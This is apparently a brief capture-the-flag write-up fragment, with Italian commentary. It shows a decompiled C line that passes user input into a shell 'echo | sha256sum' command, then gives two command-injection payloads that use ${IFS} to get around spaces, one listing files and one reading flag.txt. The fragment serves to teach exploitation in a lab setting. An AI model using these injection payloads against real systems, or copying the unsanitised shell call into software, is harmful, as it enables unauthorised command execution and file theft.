```c
FUN_001012b0(acStack_828,1,1024,"echo -n \"%s\" | sha256sum | cut -f 1 -d \\ ",param_1);
```

Da questa riga possiamo iniettare comandi

`CCIT{";${IFS}ls;${IFS}echo${IFS}"}` 

`CCIT{";${IFS}cat${IFS}flag.txt;${IFS}echo${IFS}"}`